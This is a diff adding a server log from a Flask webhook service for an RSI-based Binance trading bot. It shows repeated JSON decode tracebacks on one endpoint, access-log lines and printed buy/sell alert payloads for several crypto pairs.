+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:06] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004747
+(22236) accepted ('34.212.75.30', 37434)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:06] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.018155
+(22236) accepted ('52.32.178.7', 53902)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004198
+(22236) accepted ('34.212.75.30', 37548)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.005515
+(22236) accepted ('34.212.75.30', 37550)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004929
+(22236) accepted ('52.32.178.7', 53954)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006110
+(22236) accepted ('52.32.178.7', 53958)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006871
+(22236) accepted ('34.212.75.30', 37606)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:07] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006108
+(22236) accepted ('34.212.75.30', 37786)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:09] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006886
+(22236) accepted ('52.32.178.7', 54130)
+'----------------------------2023-07-12 16:13:17-----------------------------'
+b'D-RSI Exit Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:23-----------------------------'
+b'D-RSI Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:23-----------------------------'
+b'D-RSI Exit Long BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:13:23-----------------------------'
+b'D-RSI Exit Short BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:00-----------------------------'
+b'D-RSI Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:00-----------------------------'
+b'D-RSI Exit Long BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:00-----------------------------'
+b'D-RSI Exit Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:00-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "sell",\n    "contracts": "0.017", \n    "market_position":'
+ b' "short",\n    "market_position_size": "0.0085",\n    "order_id": "short",'
+ b'\n    "price": "1891.1200000000001",\n    "ticker": "ETHUSDT",\n    "fireti'
+ b'me" : "2023-07-12T13:14:00Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:01-----------------------------'
+b'D-RSI Exit Long BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:01-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "sell",\n    "contracts": "1.184", \n    "market_position":'
+ b' "short",\n    "market_position_size": "0.592",\n    "order_id": "short",\n'
+ b'    "price": "22.52",\n    "ticker": "SOLUSDT",\n    "firetime" : "2023-07'
+ b'-12T13:14:01Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:01-----------------------------'
+b'D-RSI Exit Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:01-----------------------------'
+b'D-RSI Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:02-----------------------------'
+b'D-RSI Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:02-----------------------------'
+b'D-RSI Exit Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:02-----------------------------'
+b'D-RSI Exit Long BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:02-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "sell",\n    "contracts": "37.029", \n    "market_position"'
+ b': "short",\n    "market_position_size": "18.501",\n    "order_id": "short"'
+ b',\n    "price": "0.7412000000000001",\n    "ticker": "MATICUSDT",\n    "fir'
+ b'etime" : "2023-07-12T13:14:01Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:03-----------------------------'
+b'D-RSI Exit Long BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:03-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "sell",\n    "contracts": "0.28", \n    "market_position": '
+ b'"short",\n    "market_position_size": "0.14",\n    "order_id": "short",\n  '
+ b'  "price": "97.12",\n    "ticker": "LTCUSDT",\n    "firetime" : "2023-07-1'
+ b'2T13:14:03Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:03-----------------------------'
+b'D-RSI Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:03-----------------------------'
+b'D-RSI Exit Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:06-----------------------------'
+b'D-RSI Exit Long BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:06-----------------------------'
+b'D-RSI Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:06-----------------------------'
+b'D-RSI Exit Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:07-----------------------------'
+b'D-RSI Exit Long BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:07-----------------------------'
+b'D-RSI Exit Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:07-----------------------------'
+b'D-RSI Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:07-----------------------------'
+b'D-RSI Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:07-----------------------------'
+b'D-RSI Exit Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:07-----------------------------'
+b'D-RSI Exit Long BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:09-----------------------------'
+b'D-RSI Exit Long BINANCE:LTCUSDT'
+<class 'bytes'>
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:09] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.009014
+(22236) accepted ('52.32.178.7', 54138)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:09] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.009798
+(22236) accepted ('34.212.75.30', 38102)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
